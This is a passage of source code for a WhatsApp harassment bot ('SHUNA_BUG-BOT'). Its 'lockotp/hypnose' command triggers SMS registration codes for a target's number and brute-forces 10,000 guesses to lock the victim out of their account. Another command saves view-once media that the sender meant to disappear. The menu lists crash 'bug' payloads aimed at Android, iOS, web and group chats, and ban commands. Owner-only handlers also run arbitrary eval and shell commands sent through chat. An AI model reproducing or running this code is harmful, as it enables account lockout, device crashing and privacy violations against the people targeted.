  if (args.length < 1) return replygcxeon(`𝑰𝒏𝒄𝒐𝒓𝒓𝒆𝒄𝒕 𝒇𝒐𝒓𝒎𝒂𝒕\n\n𝑼𝒔𝒂𝒈𝒆: ${prefix+command} 𝒄𝒐𝒖𝒏𝒕𝒓𝒚_𝒄𝒐𝒅𝒆|𝒏𝒖𝒎𝒃𝒆𝒓\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix+command} 237|698581946`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return replygcxeon(`𝑰𝒏𝒄𝒐𝒓𝒓𝒆𝒄𝒕 𝒇𝒐𝒓𝒎𝒂𝒕\n\n𝑼𝒔𝒂𝒈𝒆: ${prefix+command} 𝒄𝒐𝒖𝒏𝒕𝒓𝒚_𝒄𝒐𝒅𝒆|𝒏𝒖𝒎𝒃𝒆𝒓\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix+command} 237|698581946`);
  const xeonCountryCode = args2[0];
  const xtarget = args2[1];
  const xeonNumber = xtarget.replace('@s.whatsapp.net', '');
  const xeonmerge = `${xeonCountryCode}${xtarget}`
  const xeonMention = xeonmerge + '@s.whatsapp.net';
  sendMessageWithMentions(
    "𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒂𝒄𝒕𝒊𝒗𝒂𝒕𝒆𝒅 𝑯𝒀𝑷𝑵𝑶𝑺𝑬/𝑶𝑻𝑷 𝑳𝑶𝑪𝑲 𝑻𝑶 @" + xeonMention.split('@')[0] + 
    " 𝑼𝒔𝒊𝒏𝒈 *" + command + "* ✅\n\n𝑷𝒂𝒖𝒔𝒆 2 𝒎𝒊𝒏𝒖𝒕𝒆 𝒔𝒐 𝒕𝒉𝒂𝒕 𝒚𝒐𝒖 𝒂𝒏𝒅 𝒔𝒉𝒖𝒏𝒂 𝒔𝒉𝒐𝒖𝒍𝒅 𝒏𝒐𝒕 𝒃𝒆 𝒃𝒂𝒏𝒏𝒆𝒅.", 
    [xeonMention]
  );
  try {
    const { stateXeon, saveCredsXeon } = await useMultiFileAuthState('./session');
    const xeonRequest = await XeonBotInc.requestRegistrationCode({
      phoneNumber: '+' + xeonCountryCode + `${xeonNumber}`,
      phoneNumberCountryCode: xeonCountryCode,
      phoneNumberNationalNumber: `${xeonNumber}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var xeonPrefix = Math.floor(Math.random() * 999);
      var xeonSuffix = Math.floor(Math.random() * 999);
      await XeonBotInc.register(`${xeonPrefix}-${xeonSuffix}`);
    } catch (err) {
      console.log(`${xeonPrefix}-${xeonSuffix}`);
    }
  }
}
break;

case 'readviewonce': case 'vv': {
	if (!m.quoted) return replygcxeon(`𝑹𝒆𝒑𝒍𝒚 𝒕𝒐 𝒗𝒊𝒆𝒘𝒐𝒏𝒄𝒆 𝒎𝒆𝒔𝒔𝒂𝒈𝒆 𝒅𝒂𝒓𝒍𝒊𝒏𝒈`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcxeon(`𝑫𝒂𝒓𝒍𝒊𝒏𝒈🍭 𝒕𝒉𝒊𝒔 𝒊𝒔 𝒏𝒐𝒕 𝒂 𝒗𝒊𝒆𝒘𝒐𝒏𝒄𝒆 𝒎𝒆𝒔𝒔𝒂𝒈𝒆`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
            case 'menu':
            case 'help':
            case 'm':
            case '?':
            case 'shuna':
                let xeonmenuoh = `╭━━━〔⁩𝗦𝗛𝗨𝗡𝗔_𝗕𝗨𝗚-𝗕𝗢𝗧 〕━━✦
╭━━━━━━━━━━━━━━━✦
┃🌸User: ${pushname}
┃🌸${xeonytimewisher} 
┃🌸Runtime:${runtime(process.uptime())}
┃🌸Date: Gômen no date
┃🌸Time: Gômen no time
┃🌸Dev: Limule Solitarus 
┃🌸owner:${ownername}
╰━━━━━━━━━━━━━━━✦
╰━━━━━━━━━━━━━━━━━━━━✦
> ©2025 Limule Solitarus 

╭━━━ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ🐉 ━━✦
┃🌸 xshuna 
┃🌸 xshuna2
┃🌸 vermeil
┃🌸 gun
┃🌸 azathoth
┃🌸 souleater
┃🌸 soulkill
┃🌸 sealing
┃🌸 amaterasu
╰━━━━━━━━━━━━━━━✦
╭━━━ ʙᴜɢ ᴡᴇʙ👾 ━━✦
┃🌸 sealing
┃🌸 xblankscrn
┃🌸 xwebgc
╰━━━━━━━━━━━━━━━✦
╭━━━ ʙᴜɢ ɪᴏꜱ⚠︎ ━━✦
┃🌸 belzebuth
┃🌸 shunaoff
┃🌸 chaos
┃🌸 limule
┃🌸 xioshot
╰━━━━━━━━━━━━━━━✦
╭━━━ ʙᴜɢ ᴏᴛʜᴇʀ♲︎ ━━✦
┃🌸 lockotp
┃🌸 hypnose
╰━━━━━━━━━━━━━━━✦
╭━━━ ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ☠︎ ━━✦
┃🌸 tempest
┃🌸 androgc
┃🌸 iosgc
┃🌸 xjpmgc
┃🌸 theos
╰━━━━━━━━━━━━━━━✦
╭━━━ ʙᴀɴ/ᴜɴʙᴀɴ ᴍᴇɴᴜ✞ ━━✦
┃🌸 helpban
┃🌸 banv1
┃🌸 banv2
┃🌸 banv3
┃🌸 banv4
┃🌸 banv5
┃🌸 banv6
┃🌸 unbanv1
┃🌸 unbanv2
┃🌸 unbanv3
┃🌸 unbanv4
┃🌸 unbanv5
╰━━━━━━━━━━━━━━━✦
╭━━━ ᴏᴡɴᴇʀ ᴍᴇɴᴜ🧑 ━━✦
┃🌸 getsession
┃🌸 deletesession
┃🌸 join
┃🌸 shutdown  
┃🌸 restart
┃🌸 autoread *[option]*
┃🌸 autotyping *[option]*
┃🌸 autorecording *[option]*
┃🌸 autorecordtyp *[option]*
┃🌸 autobio *[option]*
┃🌸 autoswview *[option]*
┃🌸 mode *[option]*
┃🌸 block
┃🌸 unblock 
┃🌸 backup
┃🌸 getcase
┃🌸 addowner
┃🌸 delowner
┃🌸 shunapp
╰━━━━━━━━━━━━━━━✦
╭━━━ ɢʀᴏᴜᴘ ᴍᴇɴᴜ👥 ━━✦
┃🌸 closetime
┃🌸 opentime
┃🌸 kick
┃🌸 add
┃🌸 promote
┃🌸 demote
┃🌸 setdesc
┃🌸 setppgc
┃🌸 tagall
┃🌸 shunatag
┃🌸 totag
┃🌸 group *[option]*
┃🌸 editinfo
┃🌸 linkgc
┃🌸 revoke
┃🌸 listonline
┃🌸 antilink
┃🌸 alive
╰━━━━━━━━━━━━━━━✦
╭━━━ ᴍᴀɪɴ ᴍᴇɴᴜ❤️ ━━✦
┃🌸 shuna
┃🌸 buypremium
┃🌸 runtime
┃🌸 script
┃🌸 donate
┃🌸 owner
╰━━━━━━━━━━━━━━━✦
╭━━━ ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ🔃 ━━✦
┃🌸 sticker
┃🌸 smeme
┃🌸 take
┃🌸 toimage
┃🌸 tovideo
┃🌸 toaudio
┃🌸 tomp3
┃🌸 tovn
┃🌸 togif
┃🌸 tourl
┃🌸 toqr
┃🌸 toviewonce
┃🌸 fliptext
┃🌸 tgs
┃🌸 emojimix
╰━━━━━━━━━━━━━━━✦
╭━━━ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ📂 ━━✦
┃🌸 addvideo
┃🌸 addimage
┃🌸 addsticker
┃🌸 addvn
┃🌸 addzip
┃🌸 addapk
┃🌸 addpdf
┃🌸 delvideo
┃🌸 delimage
┃🌸 delsticker
┃🌸 delvn
┃🌸 delzip
┃🌸 delapk
┃🌸 delpdf
┃🌸 listvideo
┃🌸 listimage
┃🌸 liststicker
┃🌸 listvn
┃🌸 listzip
┃🌸 listapk
┃🌸 listpdf
╰━━━━━━━━━━━━━━━✦

╭━━━ ʙɪʙʟᴇ ᴍᴇɴᴜ📖 ━━✦
┃🌸 bible1
╰━━━━━━━━━━━━━━━✦

╭━━━ ᴅᴏᴡɴ ᴍᴇɴᴜ📥 ━━✦
┃🌸 play
┃🌸 ytmp3
┃🌸 ytmp4
┃🌸 sound1 - sound161
╰━━━━━━━━━━━━━━━✦
> powered by Limule Solitarus`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xeonmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://iili.io/dP0sxmg.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/thumb2.mp4'),
      gifPlayback: true,
      caption: xeonmenuoh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl:'https://iili.io/dP0QBOF.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/thumb.jpg'),
                        caption: xeonmenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xeonmenuoh
                        }
                    }, {})
                }
                break
                case 'tgs': {
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replygcxeon(`𝑫𝒂𝒓𝒍𝒊𝒏𝒈🍭 𝑺𝒆𝒏𝒅𝒊𝒏𝒈 ${xeonresources.length} 𝒔𝒕𝒊𝒄𝒌𝒆𝒓𝒔...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replygcxeon('𝑵𝒖𝒎𝒃𝒆𝒓 𝒐𝒇 𝒔𝒕𝒊𝒄𝒌𝒆𝒓 𝒎𝒐𝒓𝒆 𝒕𝒉𝒂𝒏 30 𝒃𝒂𝒃𝒆, 𝒔𝒉𝒖𝒏𝒂 𝒘𝒊𝒍𝒍 𝒔𝒆𝒏𝒅 𝒊𝒕 𝒊𝒏 𝒑𝒓𝒊𝒗𝒂𝒕𝒆 𝒄𝒉𝒂𝒕☺.')
			for (let i = 0; i < xeonresources.length; i++) {
				XeonBotInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				XeonBotInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replygcxeon(`𝑾𝒉𝒆𝒓𝒆 𝒊𝒔 𝒕𝒉𝒆 𝒕𝒆𝒍𝒆𝒈𝒓𝒂𝒎𝒎𝒆 𝒔𝒕𝒊𝒄𝒌𝒆𝒓 𝒍𝒊𝒏𝒌 𝒅𝒆𝒂𝒓?\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replygcxeon(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcxeon(bang)
                    }
                    try {
                        replygcxeon(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcxeon(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replygcxeon(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcxeon(evaled)
                    } catch (err) {
                        await replygcxeon(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replygcxeon(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcxeon(err)
                        if (stdout) return replygcxeon(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})